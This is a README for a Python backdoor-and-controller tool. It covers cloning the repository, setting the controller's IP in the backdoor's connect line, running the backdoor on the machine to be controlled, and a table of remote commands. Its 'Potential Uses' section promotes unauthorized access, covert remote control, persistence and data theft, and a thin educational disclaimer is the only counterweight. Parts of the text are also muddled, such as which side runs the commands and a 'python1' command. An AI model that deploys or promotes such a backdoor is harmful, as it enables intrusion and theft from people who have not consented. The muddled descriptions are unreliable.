# Backdoor-And-Server 💻🔗

- Welcome to the Backdoor-And-Server project, a powerful yet educational server-client Python application that enables you to remotely execute commands on the server from the backdoor. 

## Warning 🚨
**Please note that this project is intended for educational and research purposes only. Use it responsibly and only on devices and systems for which you have explicit authorization. The author of this project is not responsible for any misuse or illegal activities involving this software.**

## Table of Contents

1. [Installation Process](#installation-process-) 📥
2. [Requirements](#requirements-%EF%B8%8F) 🛠️
3. [Pre-Execution Setup](#pre-execution-%EF%B8%8F) ⏮️
4. [Execution](#execution-%EF%B8%8F) 🏃‍♂️
5. [Available Commands](#available-commands-) 💻
6. [Potential Uses](#potential-uses-) 💡

## Installation Process 📥

- Let's get you started with Backdoor-And-Server. First, clone the repository and navigate to the `Backdoor-And-Server` directory:

```bash
$ git clone https://github.com/Advaidv121/Backdoor-And-Server && cd Backdoor-And-Server
```

## Requirements 🛠️

Next, install the requirements using pip3 with the following instructions:

For **Server.py**
```
$ pip3 install pyautogui
```
For **Backdoor.py**
```
$ pip3 install tqdm
```

## Pre Execution ⏮️

- On line number **137** of **server.py** file
```
137. sock.bind(('xx.xxx.xx.xx',xxxx)) #replace 'xx.xxx.xx.xx' with server ip and xxxx with port number
```
- On line number **153** of **backdoor.py** file
```
153. s.connect(('xx.xxx.xx.xx',xxxx))  #replace 'xx.xxx.xx.xx' with server ip and xxxx with port number
```

## Execution 🏃‍♂️

- Run the backdoor.py script on the machine you want to control:
```
python backdoor.py
```
- Run the server.py script on the machine from which you want to control the server:
```
python server.py
```
- This will establish a connection with the server, and you can start sending commands to be executed on the server.🛜

## Available Commands 💡

- Here's a table of the commands you can run on the server from the client:

| Command                | Description                                                     |
|------------------------|-----------------------------------------------------------------|
| `ls`                   | List the files and directories in the current directory.        |
| `cd <foldername>`      | Change the current directory to the specified folder.           |
| `cd ..`                | Navigate to the parent directory.                               |
| `pwd`                  | Print the current working directory.                            |
| `cat`                  | Display the contents of a text file.                            |
| `python1 <filename>`   | Execute a Python 1.x script with the specified filename.        |
| `python3 <filename>`   | Execute a Python 3.x script with the specified filename.        |
| `copy <filename>`      | Copy a file from the client to the server.                      |
| `bye`                  | Disconnect from the server.                                     |
| `scrst`                | Command description not provided.                               |
| `send <filename>`      | Send a file to the server.                                      |
| `help`                 | Display a list of available commands.                           |



## Potential Uses 🌟

- Backdoor and server can be used for:

-Unauthorized Access: Malicious actors use backdoors to gain unauthorized access to a computer system, network, or device. This unauthorized access can lead to data theft, surveillance, or further exploitation.

-Remote Control: Backdoors provide remote control over a compromised system. Attackers can manipulate the victim's computer, executing commands and actions without the user's knowledge or consent.

-Persistence: Backdoors are often used to maintain a persistent presence within a compromised network or system. This allows attackers to maintain access even if initial security flaws are patched.

-Data Theft: Backdoors enable the exfiltration of sensitive data, such as personal information, financial records, or intellectual property, which can then be misused or sold.
